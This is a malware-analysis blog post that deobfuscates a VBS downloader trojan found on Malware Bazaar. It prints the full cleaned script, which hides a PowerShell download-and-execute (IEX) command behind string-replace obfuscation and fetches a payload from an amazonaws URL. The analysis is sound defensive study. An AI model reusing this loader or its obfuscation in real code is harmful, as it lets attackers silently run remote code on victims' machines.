<!DOCTYPE html><html lang="en-ca"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no"><title>Malware Analysis - VBS mp3 Downloader - AlrikRr&#x27;s Blog</title><meta name="description" content="Hi ! Here is a Simple Malware Analysis of a VBS script I found on Malware Bazaar ! Enjoy !&hellip;"><meta name="generator" content="Publii Open-Source CMS for Static Site"><script type="gdpr-blocker/Google Analytics">(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
						new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
						j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
						'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
					})(window,document,'script','dataLayer','G-22SHFE01F3');</script><link rel="stylesheet" href="https://alrikrr.github.io/media/plugins/syntaxHighlighter/prism-black.css"><link rel="canonical" href="https://alrikrr.github.io/malware-analysis-vbs-mp3-downloader/"><link rel="alternate" type="application/atom+xml" href="https://alrikrr.github.io/feed.xml"><link rel="alternate" type="application/json" href="https://alrikrr.github.io/feed.json"><meta property="og:title" content="Malware Analysis - VBS mp3 Downloader"><meta property="og:image" content="https://alrikrr.github.io/media/posts/18/pa.jpg"><meta property="og:image:width" content="1920"><meta property="og:image:height" content="1095"><meta property="og:site_name" content="AlrikRr's Blog"><meta property="og:description" content="Hi ! Here is a Simple Malware Analysis of a VBS script I found on Malware Bazaar ! Enjoy !&hellip;"><meta property="og:url" content="https://alrikrr.github.io/malware-analysis-vbs-mp3-downloader/"><meta property="og:type" content="article"><meta name="twitter:card" content="summary"><meta name="twitter:site" content="@alrikrr"><meta name="twitter:title" content="Malware Analysis - VBS mp3 Downloader"><meta name="twitter:description" content="Hi ! Here is a Simple Malware Analysis of a VBS script I found on Malware Bazaar ! Enjoy !&hellip;"><meta name="twitter:image" content="https://alrikrr.github.io/media/posts/18/pa.jpg"><link rel="shortcut icon" href="https://alrikrr.github.io/media/website/android-chrome-192x192.png" type="image/x-icon"><link rel="stylesheet" href="https://alrikrr.github.io/assets/css/fontawesome-all.min.css?v=bbcde81f26378440dac4c3d195714389"><link rel="stylesheet" href="https://alrikrr.github.io/assets/css/style.css?v=9b43267d2b7457feeb36a64550d71700"><script type="application/ld+json">{"@context":"http://schema.org","@type":"Article","mainEntityOfPage":{"@type":"WebPage","@id":"https://alrikrr.github.io/malware-analysis-vbs-mp3-downloader/"},"headline":"Malware Analysis - VBS mp3 Downloader","datePublished":"2022-01-29T21:20","dateModified":"2023-08-22T14:08","image":{"@type":"ImageObject","url":"https://alrikrr.github.io/media/posts/18/pa.jpg","height":1095,"width":1920},"description":"Hi ! Here is a Simple Malware Analysis of a VBS script I found on Malware Bazaar ! Enjoy !&hellip;","author":{"@type":"Person","name":"AlrikRr","url":"https://alrikrr.github.io/authors/alrikrr/"},"publisher":{"@type":"Organization","name":"AlrikRr"}}</script><noscript><style>img[loading] {
                    opacity: 1;
                }</style></noscript></head><body class="is-preload"><div id="wrapper"><div id="main"><div class="inner"><header id="header"><a class="logo" href="https://alrikrr.github.io/"><strong>AlrikRr&#x27;s Blog</strong></a><ul class="icons"><li><a href="https://twitter.com/AlrikRr" class="icon brands fa-twitter"><span class="label">Twitter</span></a></li><li><a href="https://www.linkedin.com/in/adrien-lasalle/" class="icon brands fa-linkedin"><span class="label">LinkedIn</span></a></li><li><a href="https://www.youtube.com/channel/UCHUrf2NqybwOFQ6tfYt3zNA" class="icon brands fa-youtube"><span class="label">YouTube</span></a></li></ul></header><article class="post"><header class="main post__header"><time datetime="2022-01-29T21:20" class="post__date">29 January 2022</time><h1>Malware Analysis - VBS mp3 Downloader</h1></header><figure class="image main"><img src="https://alrikrr.github.io/media/posts/18/pa.jpg" srcset="https://alrikrr.github.io/media/posts/18/responsive/pa-xs.jpg 300w, https://alrikrr.github.io/media/posts/18/responsive/pa-sm.jpg 480w, https://alrikrr.github.io/media/posts/18/responsive/pa-md.jpg 768w, https://alrikrr.github.io/media/posts/18/responsive/pa-lg.jpg 1024w, https://alrikrr.github.io/media/posts/18/responsive/pa-xl.jpg 1360w, https://alrikrr.github.io/media/posts/18/responsive/pa-xxl.jpg 1600w" sizes="(max-width: 1600px) 100vw, 1600px" loading="lazy" height="1095" width="1920" alt=""></figure><div class="post__inner post__entry"><p>Hi ! Here is a Simple Malware Analysis of a VBS script I found on Malware Bazaar !</p><p>Enjoy !</p><hr><h1 id="identification">Identification</h1><table><thead><tr><th>Name</th><th>71f51f194201d9d3a86fa99255909017632302bd7007b50b400490a5cd4a4043.vbs</th></tr></thead><tbody><tr><td>Hash (256)</td><td>3dbfb4bcbc5432a332fa3f21ffcefcf2cbf1c990</td></tr><tr><td>Size</td><td>71K</td></tr><tr><td>From</td><td><a href="https://bazaar.abuse.ch/download/71f51f194201d9d3a86fa99255909017632302bd7007b50b400490a5cd4a4043/">https://bazaar.abuse.ch/download/71f51f194201d9d3a86fa99255909017632302bd7007b50b400490a5cd4a4043/</a></td></tr></tbody></table><h1 id="vbs---code">VBS - Code</h1><p>Hello There !</p><p>Today we are going to check a VBS code and see what’s inside.</p><p>Here is the VT result, only 17 EDR trigger this file as malicious. We can see some title and tags, it seems to be a downloader trojan.</p><p><a href="https://www.virustotal.com/gui/file/71f51f194201d9d3a86fa99255909017632302bd7007b50b400490a5cd4a4043/detection">VirusTotal</a></p><p><img loading="lazy" src="https://alrikrr.github.io/posts/malware/investigations/vbs-mp3-downloader-1/Untitled.png" alt="Untitled" data-is-external-image="true"></p><h2 id="clear-code---comments">Clear code - comments</h2><p>First we need to clear the comment since there are a lot of these in the code. Comments are use very often inside script file such as VBS to blur the tracks.</p><p><img loading="lazy" src="https://alrikrr.github.io/posts/malware/investigations/vbs-mp3-downloader-1/Untitled1.png" alt="Untitled" data-is-external-image="true"></p><p>There are like 30 lines of comments and since we don’t need them we can get rid of them using the <strong>Search &amp; Replace</strong> option on Sublime Text (<code>CTRL+H</code>)</p><p>Using this regex <code>^.*msad.*\n</code> we select all the comments and the replace is not fill, the comments are done and the code is more readable but still a mess.</p><p><img loading="lazy" src="https://alrikrr.github.io/posts/malware/investigations/vbs-mp3-downloader-1/Untitled2.png" alt="All the code is present in the screen" data-is-external-image="true"></p><p>All the code is present in the screen</p><h2 id="clear-code---first-variables">Clear code - First Variables</h2><p>We can see some strings variables at the start, if we look quickly into it we can see some readable text like <code>System</code>, <code>Replace()</code> and an interesting URL <code>ate.amazonaws.com/1643406871-d.mp3</code>. Looks like C&amp;C url or malware url but for now, let’s keep going.</p><p><img loading="lazy" src="https://alrikrr.github.io/posts/malware/investigations/vbs-mp3-downloader-1/Untitled3.png" alt="Untitled" data-is-external-image="true"></p><p>I paste the variable inside a python script and renamed them with <code>var</code> followed by a number to be more convinient.</p><p>This technique of obfuscation is well known, these long strings contain actual readable code between trash characters, the readable strings are extracted and then executed, this is an obfucation method used to by-pass any antivirus that would ask too many questions on the content of a file.</p><blockquote><p>Sometimes you can see random code and random function called between malicious code just to fool EDRs</p></blockquote><p>Belowe the 9 variables we can see another variable using a replace statement</p><p><code>diTG = replace("WYePOcript.YePOhEll","YePO","s")</code></p><p>Using the ame method but in python gives us the name of the shell file here <code>Wscript.shell</code></p><p><img loading="lazy" src="https://alrikrr.github.io/posts/malware/investigations/vbs-mp3-downloader-1/Untitled4.png" alt="Untitled" data-is-external-image="true"></p><p>The Idea is to do the same using a python script on the 9 var and see what they have to offer.</p><p><img loading="lazy" src="https://alrikrr.github.io/posts/malware/investigations/vbs-mp3-downloader-1/Untitled5.png" alt="Untitled" data-is-external-image="true"></p><p>The result is not really explicit since it appears to be another obsfucation method, like the first one.</p><p>In this otput we start to see some PowerShell code and most of all the full URL</p><p><code>https://v3-fastupload.s3-accelerate.amazonaws.com/1643406871-d.mp3</code></p><p>We could stop the analysis since we got the URL that seems to download the real malware here but let’s keep going.</p><p>Here is the previous python output in a better view and renamed variables</p><p><img loading="lazy" src="https://alrikrr.github.io/posts/malware/investigations/vbs-mp3-downloader-1/Untitled6.png" alt="Untitled" data-is-external-image="true"></p><p>Since this is a PowerShell script, we can clearly see wha’t going on here. Like we did in python, this script is doing the same and join every string variable into one <code>$final_var</code>. Let’s create the same code in python and check the content of this <code>$final_var</code> shall we.</p><div class="highlight"><pre tabindex="0"><code class="language-python hljs" data-lang="python">another_var1=<span class="hljs-string">'(NixwTc6t'</span>.replace(<span class="hljs-string">'ixwTc6t'</span>,<span class="hljs-string">'ew-'</span>)
another_var2 = <span class="hljs-string">'8hZqv4S '</span>.replace(<span class="hljs-string">'8hZqv4S'</span>,<span class="hljs-string">'Object'</span>)
another_var3 = <span class="hljs-string">'N10t1mbR'</span>.replace(<span class="hljs-string">'10t1mbR'</span>,<span class="hljs-string">'et'</span>)
another_var4 = <span class="hljs-string">'.WVImHNDj'</span>.replace(<span class="hljs-string">'VImHNDj'</span>,<span class="hljs-string">'e'</span>)
another_var5=<span class="hljs-string">'.D3Z279nZ'</span>.replace(<span class="hljs-string">'3Z279nZ'</span>,<span class="hljs-string">'ownlo'</span>)
another_var6= <span class="hljs-string">'bfqeWWCp'</span>.replace(<span class="hljs-string">'fqeWWCp'</span>,<span class="hljs-string">'Client)'</span>)
another_var7=<span class="hljs-string">'adString("https://v3-fastupload.s3-accelerate.amazonaws.com/1643406871-d.mp3")'</span>
final_var= another_var1 + another_var2 + another_var3 + another_var4 + another_var6 + another_var5 + another_var7
print(final_var)
</code></pre></div><p><img loading="lazy" src="https://alrikrr.github.io/posts/malware/investigations/vbs-mp3-downloader-1/Untitled7.png" alt="Untitled" data-is-external-image="true"></p><p>As expected, this PowerShell command line is downloading the mp3 file located at this URL, this is 100% sure the location of the real malware.</p><p>Don’t forget the <code>CreateObject()</code> function used before the replace function.</p><p>The CreateObject function creates an object of a specified type. Here the shell file.</p><p><code>Set GmrK = CreateObject(wscipt_shell)</code></p><h2>Clear code - Last part</h2><p>Here is the last part with clear variable name.</p><p><img loading="lazy" src="https://alrikrr.github.io/posts/malware/investigations/vbs-mp3-downloader-1/Untitled8.png" alt="Untitled" data-is-external-image="true"></p><p>We can see two variable creation, one used to store the content of the <code>powershell</code> command to call <code>powershell.exe</code> on a windows prompt.</p><p>Then the second one that I rename <code>powerhell_full_cmd_download</code> , used to store the full powershell command with the <code>powerhell</code> call.</p><p>The <code>InStr()</code> function does not seem to do anything since it compare the number of characters in the powershell command and then check if superior to zero then do nothing.</p><p>At the and we can see the Object of <code>wscript.shell</code> running the powershell command to download its content on the computer.</p><h1 id="vbs---mp3">VBS - mp3</h1><p>I still manage to download the mp3 file using <code>wget</code> on my linux.</p><p><img loading="lazy" src="https://alrikrr.github.io/posts/malware/investigations/vbs-mp3-downloader-1/Untitled9.png" alt="Untitled" data-is-external-image="true"></p><p><strong>Unfortunatly there is not part2 since I lost the final part 👺</strong></p><h1 id="clear-codevbs">clear-code.vbs</h1><p>Here is the cleared VBS code</p><div class="highlight"><pre tabindex="0"><code class="language-vbnet" data-lang="vbnet">on error resume next
Dim var1,var2,var3,var4,var5,var6,var7,var8,var9
var1 = " $6!/*!\!7!/*!\!1!/*!\!4!/*!\!4LvLJJRX=6!/*!\!7!/*!\!1!/*!\!4!/*!\!4'(N6!/*!\!7!/*!\!1!/*!\!4!/*!\!4ixwTc6t6!/*!\!7!/*!\!1!/*!\!4!/*!\!4'.Replace(6!/*!\!7!/*!\!1!/*!\!4!/*!\!4'6!/*!\!7!/*!\!1!/*!\!4!/*!\!4ixwTc6t6!/*!\!7!/*!\!1!/*!\!4!/*!\!4',6!/*!\!7!/*!\!1!/*!\!4!/*!\!4'ew-6!/*!\!7!/*!\!1!/*!\!4!/*!\!4');"
var2 = "[7!/*!\!!/*!\!6!/*!\!!/*!\!1!/*!\!!/*!\!8!/*!\!!/*!\!5System.Thr7!/*!\!!/*!\!6!/*!\!!/*!\!1!/*!\!!/*!\!8!/*!\!!/*!\!5eading.Th7!/*!\!!/*!\!6!/*!\!!/*!\!1!/*!\!!/*!\!8!/*!\!!/*!\!5read]::Sl7!/*!\!!/*!\!6!/*!\!!/*!\!1!/*!\!!/*!\!8!/*!\!!/*!\!5eep(153);$7!/*!\!!/*!\!6!/*!\!!/*!\!1!/*!\!!/*!\!8!/*!\!!/*!\!55wQo1Xb = 7!/*!\!!/*!\!6!/*!\!!/*!\!1!/*!\!!/*!\!8!/*!\!!/*!\!5'7!/*!\!!/*!\!6!/*!\!!/*!\!1!/*!\!!/*!\!8!/*!\!!/*!\!58hZqv4S 7!/*!\!!/*!\!6!/*!\!!/*!\!1!/*!\!!/*!\!8!/*!\!!/*!\!5'.Replace(7!/*!\!!/*!\!6!/*!\!!/*!\!1!/*!\!!/*!\!8!/*!\!!/*!\!5'7!/*!\!!/*!\!6!/*!\!!/*!\!1!/*!\!!/*!\!8!/*!\!!/*!\!58hZqv4S7!/*!\!!/*!\!6!/*!\!!/*!\!1!/*!\!!/*!\!8!/*!\!!/*!\!5',7!/*!\!!/*!\!6!/*!\!!/*!\!1!/*!\!!/*!\!8!/*!\!!/*!\!5'Object7!/*!\!!/*!\!6!/*!\!!/*!\!1!/*!\!!/*!\!8!/*!\!!/*!\!5');"
var3 = "$7!/*!\!!/*!\!4!/*!\!!/*!\!7!/*!\!!/*!\!8!/*!\!!/*!\!1xji96z8 = '7!/*!\!!/*!\!4!/*!\!!/*!\!7!/*!\!!/*!\!8!/*!\!!/*!\!1N10t1mbR'7!/*!\!!/*!\!4!/*!\!!/*!\!7!/*!\!!/*!\!8!/*!\!!/*!\!1.Replace('10t1mbR7!/*!\!!/*!\!4!/*!\!!/*!\!7!/*!\!!/*!\!8!/*!\!!/*!\!1','et');$msqT7OS = '.WVImHNDj'.Replace('VImHNDj',7!/*!\!!/*!\!4!/*!\!!/*!\!7!/*!\!!/*!\!8!/*!\!!/*!\!1'e7!/*!\!!/*!\!4!/*!\!!/*!\!7!/*!\!!/*!\!8!/*!\!!/*!\!1');"
var4 = "3!/*!\!!/*!\!!/*!\!5!/*!\!!/*!\!!/*!\!9!/*!\!!/*!\!!/*!\!9!/*!\!!/*!\!!/*!\!2[System.T3!/*!\!!/*!\!!/*!\!5!/*!\!!/*!\!!/*!\!9!/*!\!!/*!\!!/*!\!9!/*!\!!/*!\!!/*!\!2hreading.Thr3!/*!\!!/*!\!!/*!\!5!/*!\!!/*!\!!/*!\!9!/*!\!!/*!\!!/*!\!9!/*!\!!/*!\!!/*!\!2ead]::Sl3!/*!\!!/*!\!!/*!\!5!/*!\!!/*!\!!/*!\!9!/*!\!!/*!\!!/*!\!9!/*!\!!/*!\!!/*!\!2eep(690);$ofZFAIi='.D3Z279nZ'.Replace(3!/*!\!!/*!\!!/*!\!5!/*!\!!/*!\!!/*!\!9!/*!\!!/*!\!!/*!\!9!/*!\!!/*!\!!/*!\!2'3!/*!\!!/*!\!!/*!\!5!/*!\!!/*!\!!/*!\!9!/*!\!!/*!\!!/*!\!9!/*!\!!/*!\!!/*!\!23Z279nZ3!/*!\!!/*!\!!/*!\!5!/*!\!!/*!\!!/*!\!9!/*!\!!/*!\!!/*!\!9!/*!\!!/*!\!!/*!\!2',3!/*!\!!/*!\!!/*!\!5!/*!\!!/*!\!!/*!\!9!/*!\!!/*!\!!/*!\!9!/*!\!!/*!\!!/*!\!2'ownlo3!/*!\!!/*!\!!/*!\!5!/*!\!!/*!\!!/*!\!9!/*!\!!/*!\!!/*!\!9!/*!\!!/*!\!!/*!\!2'3!/*!\!!/*!\!!/*!\!5!/*!\!!/*!\!!/*!\!9!/*!\!!/*!\!!/*!\!9!/*!\!!/*!\!!/*!\!2);"
var5 = "$1!/*!\!!/*!\!!/*!\!!/*!\!1!/*!\!!/*!\!!/*!\!!/*!\!3!/*!\!!/*!\!!/*!\!!/*!\!7!/*!\!!/*!\!!/*!\!!/*!\!5j7i23VG1!/*!\!!/*!\!!/*!\!!/*!\!1!/*!\!!/*!\!!/*!\!!/*!\!3!/*!\!!/*!\!!/*!\!!/*!\!7!/*!\!!/*!\!!/*!\!!/*!\!5 = 'bfqeWWCp'.Replace('fqeWWCp','Cl1!/*!\!!/*!\!!/*!\!!/*!\!1!/*!\!!/*!\!!/*!\!!/*!\!3!/*!\!!/*!\!!/*!\!!/*!\!7!/*!\!!/*!\!!/*!\!!/*!\!5ient)');$D2buXdn='adString(''htt1!/*!\!!/*!\!!/*!\!!/*!\!1!/*!\!!/*!\!!/*!\!!/*!\!3!/*!\!!/*!\!!/*!\!!/*!\!7!/*!\!!/*!\!!/*!\!!/*!\!5ps://v3-fastupload.s3-acceler"
var6 = "0!/*!\!!/*!\!4!/*!\!!/*!\!4!/*!\!!/*!\!5!/*!\!!/*!\!9ate.amazonaws.com/1643406871-d.mp3'')';[Sy0!/*!\!!/*!\!4!/*!\!!/*!\!4!/*!\!!/*!\!5!/*!\!!/*!\!9stem.Th0!/*!\!!/*!\!4!/*!\!!/*!\!4!/*!\!!/*!\!5!/*!\!!/*!\!9reading.Thre0!/*!\!!/*!\!4!/*!\!!/*!\!4!/*!\!!/*!\!5!/*!\!!/*!\!9ad]::Sl0!/*!\!!/*!\!4!/*!\!!/*!\!4!/*!\!!/*!\!5!/*!\!!/*!\!9eep(408)0!/*!\!!/*!\!4!/*!\!!/*!\!4!/*!\!!/*!\!5!/*!\!!/*!\!9;"
var7 = "8!/*!\!/*!\!!7!/*!\!/*!\!!4!/*!\!/*!\!!8!/*!\!/*!\!!6$2WigeHE=I`E8!/*!\!/*!\!!7!/*!\!/*!\!!4!/*!\!/*!\!!8!/*!\!/*!\!!6`X ($LvLJJRX8!/*!\!/*!\!!7!/*!\!/*!\!!4!/*!\!/*!\!!8!/*!\!/*!\!!6,$8!/*!\!/*!\!!7!/*!\!/*!\!!4!/*!\!/*!\!!8!/*!\!/*!\!!65wQo1Xb,$8!/*!\!/*!\!!7!/*!\!/*!\!!4!/*!\!/*!\!!8!/*!\!/*!\!!6xji96z8,"
var8 = "$9!/*!\!!/*!\!!/*!\!4!/*!\!!/*!\!!/*!\!3!/*!\!!/*!\!!/*!\!6!/*!\!!/*!\!!/*!\!4msqT7OS9!/*!\!!/*!\!!/*!\!4!/*!\!!/*!\!!/*!\!3!/*!\!!/*!\!!/*!\!6!/*!\!!/*!\!!/*!\!4,$9!/*!\!!/*!\!!/*!\!4!/*!\!!/*!\!!/*!\!3!/*!\!!/*!\!!/*!\!6!/*!\!!/*!\!!/*!\!4j7i23VG9!/*!\!!/*!\!!/*!\!4!/*!\!!/*!\!!/*!\!3!/*!\!!/*!\!!/*!\!6!/*!\!!/*!\!!/*!\!4,"
var9 = "$0!/*!\!!/*!\!!/*!\!!/*!\!9!/*!\!!/*!\!!/*!\!!/*!\!4!/*!\!!/*!\!!/*!\!!/*!\!8!/*!\!!/*!\!!/*!\!!/*!\!3ofZFAIi0!/*!\!!/*!\!!/*!\!!/*!\!9!/*!\!!/*!\!!/*!\!!/*!\!4!/*!\!!/*!\!!/*!\!!/*!\!8!/*!\!!/*!\!!/*!\!!/*!\!3,$0!/*!\!!/*!\!!/*!\!!/*!\!9!/*!\!!/*!\!!/*!\!!/*!\!4!/*!\!!/*!\!!/*!\!!/*!\!8!/*!\!!/*!\!!/*!\!!/*!\!3D2buXdn -Jo0!/*!\!!/*!\!!/*!\!!/*!\!9!/*!\!!/*!\!!/*!\!!/*!\!4!/*!\!!/*!\!!/*!\!!/*!\!8!/*!\!!/*!\!!/*!\!!/*!\!3in ''0!/*!\!!/*!\!!/*!\!!/*!\!9!/*!\!!/*!\!!/*!\!!/*!\!4!/*!\!!/*!\!!/*!\!!/*!\!8!/*!\!!/*!\!!/*!\!!/*!\!3)|I`E`0!/*!\!!/*!\!!/*!\!!/*!\!9!/*!\!!/*!\!!/*!\!!/*!\!4!/*!\!!/*!\!!/*!\!!/*!\!8!/*!\!!/*!\!!/*!\!!/*!\!3X"
wscript_name = replace("WYePOcript.YePOhEll","YePO","s")

Set Object_wscript = CreateObject(wscript_name)
var1 = Replace(var1, "6!/*!\!7!/*!\!1!/*!\!4!/*!\!4", "")
var2 = Replace(var2, "7!/*!\!!/*!\!6!/*!\!!/*!\!1!/*!\!!/*!\!8!/*!\!!/*!\!5", "")
var3 = Replace(var3, "7!/*!\!!/*!\!4!/*!\!!/*!\!7!/*!\!!/*!\!8!/*!\!!/*!\!1", "")
var4 = Replace(var4, "3!/*!\!!/*!\!!/*!\!5!/*!\!!/*!\!!/*!\!9!/*!\!!/*!\!!/*!\!9!/*!\!!/*!\!!/*!\!2", "")
var5 = Replace(var5, "1!/*!\!!/*!\!!/*!\!!/*!\!1!/*!\!!/*!\!!/*!\!!/*!\!3!/*!\!!/*!\!!/*!\!!/*!\!7!/*!\!!/*!\!!/*!\!!/*!\!5", "")
var6 = Replace(var6, "0!/*!\!!/*!\!4!/*!\!!/*!\!4!/*!\!!/*!\!5!/*!\!!/*!\!9", "")
var7 = Replace(var7, "8!/*!\!/*!\!!7!/*!\!/*!\!!4!/*!\!/*!\!!8!/*!\!/*!\!!6", "")
var8 = Replace(var8, "9!/*!\!!/*!\!!/*!\!4!/*!\!!/*!\!!/*!\!3!/*!\!!/*!\!!/*!\!6!/*!\!!/*!\!!/*!\!4", "")
var9 = Replace(var9, "0!/*!\!!/*!\!!/*!\!!/*!\!9!/*!\!!/*!\!!/*!\!!/*!\!4!/*!\!!/*!\!!/*!\!!/*!\!8!/*!\!!/*!\!!/*!\!!/*!\!3", "")

Dim powershell_full_cmd_download
Dim powershell_exe

powershell_exe = Replace("198034638323898147433896822085shell","198034638323898147433896822085","power")
If InStr(var1,var2,var3,var4,var5,var6,var7,var8,var9, "") &gt; 0 Then
End If
powershell_full_cmd_download = powershell_exe+var1+var2+var3+var4+var5+var6+var7+var8+var9
Object_wscript.Run powershell_full_cmd_download,0</code></pre></div></div><footer class="post__inner post__footer"><p class="post__last-updated">This article was updated on 22 August 2023</p><div class="post__share"><h3>Share post:</h3><a href="https://twitter.com/share?url=https%3A%2F%2Falrikrr.github.io%2Fmalware-analysis-vbs-mp3-downloader%2F&amp;via=%40AlrikRr&amp;text=Malware%20Analysis%20-%20VBS%20mp3%20Downloader" class="js-share icon brands fa-twitter" rel="nofollow noopener noreferrer"><span class="label">Twitter</span> </a><a href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Falrikrr.github.io%2Fmalware-analysis-vbs-mp3-downloader%2F" class="js-share icon brands fa-linkedin" rel="nofollow noopener noreferrer"><span class="label">LinkedIn</span> </a><a href="https://api.whatsapp.com/send?text=Malware%20Analysis%20-%20VBS%20mp3%20Downloader https%3A%2F%2Falrikrr.github.io%2Fmalware-analysis-vbs-mp3-downloader%2F" class="js-share icon brands fa-whatsapp" rel="nofollow noopener noreferrer"><span class="label">WhatsApp</span></a></div><div class="post__tag"><ul><li><strong>Tagged in:</strong></li><li><a href="https://alrikrr.github.io/tags/malware/">Malware</a></li><li><a href="https://alrikrr.github.io/tags/malware-analysis/">Malware Analysis</a></li></ul></div><div class="post__bio"><img src="https://alrikrr.github.io/media/website/1675479739617.jpeg" loading="lazy" height="697" width="697" alt="AlrikRr"><div><h3><a href="https://alrikrr.github.io/authors/alrikrr/" class="invert" rel="author">AlrikRr</a></h3><p>Former Firefighter 🚒, I decided to follow my passion in computer security and pursue my studies in this domain. After a few moves all over France 🇫🇷 and 4 months of study in Warsaw, Poland, I was able to join Canada 🇨🇦 and start a new life!<br>📨 Feel free to contact me to talk cyber over coffee ☕️ !</p><ul><li class="align-left">My Github Account: <a href="https://github.com/AlrikRr" title="My Github" target="_blank" rel="noopener">AlrikRr</a></li><li class="align-left">My Twitter Account: <a href="https://twitter.com/AlrikRr" title="My Twitter" target="_blank" rel="noopener">AlrikRr</a></li><li class="align-left">Infosec.Exchange: <a href="https://infosec.exchange/@AlrikRr" title="My Mastodon Account" target="_blank" rel="noopener">@AlrikRr</a></li></ul></div></div></footer></article></div></div><div id="sidebar"><div class="inner"><nav id="menu"><header class="major"><h2>Menu</h2></header><ul><li><a href="https://alrikrr.github.io/" target="_self">Home 🏠</a></li><li><a href="https://alrikrr.github.io/authors/alrikrr/" target="_self">About me 👺</a></li><li class="has-submenu"><a href="https://alrikrr.github.io/tags/" target="_self" aria-haspopup="true" class="opener">Categories 🗂️</a><ul class="submenu level-2" aria-hidden="true"><li><a href="https://alrikrr.github.io/tags/" target="_self">All</a></li><li><a href="https://alrikrr.github.io/tags/updates/" target="_self">Personal Updates</a></li><li><a href="https://alrikrr.github.io/tags/flipperzero/" target="_self">FlipperZero</a></li><li><a href="https://alrikrr.github.io/tags/8-bits-computer/" target="_self">8 Bits Computer</a></li><li><a href="https://alrikrr.github.io/tags/iot-hacking/" target="_self">IoT Hacking</a></li><li><a href="https://alrikrr.github.io/tags/reverse-engineering/" target="_self">Reverse Engineering</a></li><li><a href="https://alrikrr.github.io/tags/malware/" target="_self">Malware</a></li><li><a href="https://alrikrr.github.io/tags/raspberrypi/" target="_self">RaspberryPi</a></li><li><a href="https://alrikrr.github.io/tags/pentesting/" target="_self">Pentesting</a></li><li><a href="https://alrikrr.github.io/tags/write-up/" target="_self">Write Up</a></li></ul></li><li class="has-submenu"><span aria-haspopup="true" class="opener">Projects 🚧</span><ul class="submenu level-2" aria-hidden="true"><li><a href="https://github.com/AlrikRr/Cisco-Smart-Exploit" target="_blank">Cisco-Smart-Exploit</a></li><li><a href="https://github.com/AlrikRr/Forensic-Extract" target="_blank">Forensic-Extract</a></li><li><a href="https://github.com/AlrikRr/USBGuardian" target="_self">USBGuardian (fork)</a></li><li><a href="https://github.com/AlrikRr/DFIR-ExtracTux" target="_blank">DFIR-Extractux</a></li></ul></li><li><a href="https://www.buymeacoffee.com/AlrikRr" target="_blank">Buy me a beer 🍺</a></li></ul></nav><section><header class="major"><h2>Get in touch</h2></header><p>📨 Feel free to contact me to talk cyber over coffee ☕️ !<br><br>=== Area of expertise ===<br>📍 Web Application Pentest (OWASP)<br>📍 Internal Active Directory &amp; SCADA Pentest<br>📍 Pentest Cloud Azure<br>📍 Python &amp; PowerShell development<br>📍 Malware Analysis</p><ul class="contact"><li class="icon solid fa-envelope">adrienlasalle[dot]pro[at]gmail[dot]com</li><li class="icon solid fa-home">Montréal, Qc 🇨🇦</li></ul></section><footer id="footer"><p class="copyright">© AlrikRr 2023 - All rights reserved</p></footer></div></div></div><script src="https://alrikrr.github.io/assets/js/jquery.min.js?v=7c14a783dfeb3d238ccd3edd840d82ee"></script><script src="https://alrikrr.github.io/assets/js/browser.min.js?v=c07298dd19048a8a69ad97e754dfe8d0"></script><script src="https://alrikrr.github.io/assets/js/breakpoints.min.js?v=81a479eb099e3b187613943b085923b8"></script><script src="https://alrikrr.github.io/assets/js/util.min.js?v=cbdaf7c20ac2883c77ae23acfbabd47e"></script><script src="https://alrikrr.github.io/assets/js/main.min.js?v=08add7f6d435054ad38ec38d7cf8be40"></script><script>var images=document.querySelectorAll("img[loading]");for(var i=0;i<images.length;i++){if(images[i].complete){images[i].classList.add("is-loaded")}else{images[i].addEventListener("load",function(){this.classList.add("is-loaded")},false)}};</script><script defer="defer" src="https://alrikrr.github.io/media/plugins/syntaxHighlighter/prism.js"></script><script defer="defer" src="https://alrikrr.github.io/media/plugins/syntaxHighlighter/prism-line-numbers.min.js"></script><script defer="defer" src="https://alrikrr.github.io/media/plugins/syntaxHighlighter/clipboard.min.js"></script><script defer="defer" src="https://alrikrr.github.io/media/plugins/syntaxHighlighter/prism-copy-to-clipboard.min.js"></script><div class="pcb" data-behaviour="badge" data-behaviour-link="#cookie-settings" data-revision="1" data-config-ttl="90" data-debug-mode="false"><div role="dialog" aria-modal="true" aria-hidden="true" aria-labelledby="pcb-title" aria-describedby="pcb-txt" class="pcb__banner"><div class="pcb__inner"><div id="pcb-title" role="heading" aria-level="2" class="pcb__title">This website uses cookies</div><div id="pcb-txt" class="pcb__txt">Select which cookies to opt-in to via the checkboxes below; our website uses cookies to examine site traffic and user activity while on our site for statistic purpose.</div><div class="pcb__buttons"><button type="button" class="pcb__btn pcb__btn--solid pcb__btn--accept">Accept all</button></div></div></div><button class="pcb__badge" aria-label="Cookie Policy" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" width="40" height="40" viewBox="0 0 23 23" fill="currentColor"><path d="M21.41 12.71c-.08-.01-.15 0-.22 0h-.03c-.03 0-.05 0-.08.01-.07 0-.13.01-.19.04-.52.21-1.44.19-2.02-.22-.44-.31-.65-.83-.62-1.53a.758.758 0 0 0-.27-.61.73.73 0 0 0-.65-.14c-1.98.51-3.49.23-4.26-.78-.82-1.08-.73-2.89.24-4.49.14-.23.14-.52 0-.75a.756.756 0 0 0-.67-.36c-.64.03-1.11-.1-1.31-.35-.19-.26-.13-.71-.01-1.29.04-.18.06-.38.03-.59-.05-.4-.4-.7-.81-.66C5.1 1.54 1 6.04 1 11.48 1 17.28 5.75 22 11.6 22c5.02 0 9.39-3.54 10.39-8.42.08-.4-.18-.78-.58-.87Zm-9.81 7.82c-5.03 0-9.12-4.06-9.12-9.06 0-4.34 3.05-8 7.25-8.86-.08.7.05 1.33.42 1.81.24.32.66.67 1.38.84-.76 1.86-.65 3.78.36 5.11.61.81 2.03 2 4.95 1.51.18.96.71 1.54 1.18 1.87.62.43 1.38.62 2.1.62.05 0 .09 0 .13-.01-1.23 3.64-4.7 6.18-8.64 6.18ZM13 17c0 .55-.45 1-1 1s-1-.45-1-1 .45-1 1-1 1 .45 1 1Zm5.29-12.3a.99.99 0 0 1-.29-.71c0-.55.45-.99 1-.99a1 1 0 0 1 .71.3c.19.19.29.44.29.71 0 .55-.45.99-1 